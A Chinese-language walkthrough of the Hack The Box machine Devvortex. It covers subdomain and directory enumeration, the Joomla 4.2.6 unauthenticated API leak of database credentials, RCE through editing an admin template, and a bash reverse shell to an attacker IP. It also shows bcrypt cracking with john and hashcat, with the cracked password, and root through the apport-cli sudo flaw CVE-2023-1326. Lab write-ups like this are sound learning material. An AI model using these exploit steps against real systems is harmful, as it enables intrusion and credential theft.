# 信息收集

![image-20231208223654398](images/1.png)

开放了22和80端口，访问80会跳转到devvortex.tab，先配置一下host

![image-20231208223808484](images/2.png)

用nmap对端口进一步探测，`-sV -sC -Pn -vv`

![image-20231208224815404](images/3.png)

![image-20231208230229495](images/4.png)

寻找子域名

![image-20231208225053206](images/5.png)

这里我用subDomainsBrute没跑出来，看wp用的是ffuf这个爆破工具，结合https://github.com/danielmiessler/SecLists这个仓库的字典，看起来还挺全

```
./ffuf -c -w ./seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs 154 -t 100 -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb"
```

还是没跑出来，直接添加hosts吧，不知道为什么，我看别人也只添加了一个hosts就跑出来了，我的字典都有这个前缀，subdomian的默认字典也有这个，用gobuster也没有跑出来

接下来扫目录

```
./gobuster dir --url dev.devvortex.htb -w common.txt -t 25 
```

看到了administrator

![image-20231210111025949](images/6.png)

# Getshell

发现是joomla

![image-20231210111053292](images/7.png)

先利用joomlascan探测一波，版本为4.2.6

![image-20231210113401659](images/8.png)

搜索发现了一个未授权访问漏洞可以泄漏数据库账号密码

```
http://127.0.0.1/Joomla4.2.7/api/index.php/v1/config/application?public=true	# config配置
http://127.0.0.1/Joomla4.2.7/api/index.php/v1/users?public=true # 用户配置
```

![image-20231210111555772](images/9.png)

![image-20231210113512797](images/10.png)

也可以网上的脚本直接跑

![image-20231210113627317](images/11.png)

这里拿到了数据库密码，还用用户名，但是连不上3306，最后用数据库账号密码（密码复用）登陆到了后台

![image-20231210113816631](images/12.png)

看到有templates，在这种php到站后台编辑模板处都可以去尝试rce，error.php是可写的

![image-20231210114009211](images/13.png)

![image-20231210114056132](images/14.png)

成功执行代码

弹个shell回来，因为这里访问一次后会恢复原来的样子

```
bash -i >& /dev/tcp/10.10.16.28/2333 0>&1
```

![image-20231210115046572](images/15.png)

![image-20231210115106323](images/16.png)

发现有python3

![image-20231210115243104](images/17.png)

升级为交互式shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20231210115555124](images/18.png)

在/etc/passwd中看到了另外的用户

![image-20231210115637237](images/19.png)

# 横向到其他用户

这个用户和刚才通过漏洞看到了User一样

![image-20231210113627317](images/11.png)

User也有这个用户，说不定也有密码复用，可以去数据库里面看看网站中这个用户的密码

![image-20231210115946427](images/21.png)

加密了， 可以尝试能不能爆破，丢hash在线识别后直接用john爆破

![image-20231210120357380](images/22.png)

![image-20231210120226840](images/23.png)

用rockyou这个字典，爆破出来是`tequieromucho`

也可以用hashcat

```
hashcat -m 3200 -a 0 -d 1 hash.txt .\rockyou.txt
```

这里直接贴别人的图了

![image-20231210120330925](images/24.png)

尝试横向

![image-20231210120506132](images/25.png)

# 提权

有了密码后，因为开始信息收集的时候也发现开了ssh的，可以ssh直接登陆，也可以继续用shell

剩下一个flag需要root用户，想办法提权，suid无果

HTB的提权很有意思，一般不是常规的suid提权，这里sudo有suid权限

![image-20231210120711874](images/26.png)

来`sudo -l`看看，反正有这个用户的密码了

![image-20231210120752001](images/27.png)

这里有一个apport-cli有sudo权限

![image-20231210121209834](images/28.png)

找到了CVE-2023-1326

https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb

这里面有poc，可以进行权限提升

![image-20231210121345248](images/29.png)

先要查看/var/crash底下有什么crash文件，但是目前没有crash文件

首先配置`bash`以保存大型转储

```
ulimit -c unlimited
```

然后强制出现分段错误，以便将核心转储为大型崩溃文件

```
sleep 10 &

killall -SIGSEGV sleep
```

![image-20231210121929713](images/30.png)

然后在/var/crash中看到了crash文件，用apport-cli直接运行这个crash

```
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
```

运行完后会提升输入什么东西

![image-20231210122126583](images/31.png)

输入`!id`

![image-20231210122143262](images/32.png)

看到了已经是root权限了，同理看到了root下的flag

![image-20231210122225932](images/33.png)





参考链接：

https://github.com/g1vi/Hack-the-box-write-ups/blob/main/Open%20beta%20season%20III%20(Fall%202023)/Week%209.%20HTB%20-%20Devvortex.MD

[HTB-Devvortex - HackerPath (timeless613.github.io)](https://timeless613.github.io/kiwi/WriteUp/HTB-Devvortex/#flag-root)

[HTB-Devvortex笔记 | CN-SEC 中文网](https://cn-sec.com/archives/2241452.html#google_vignette)
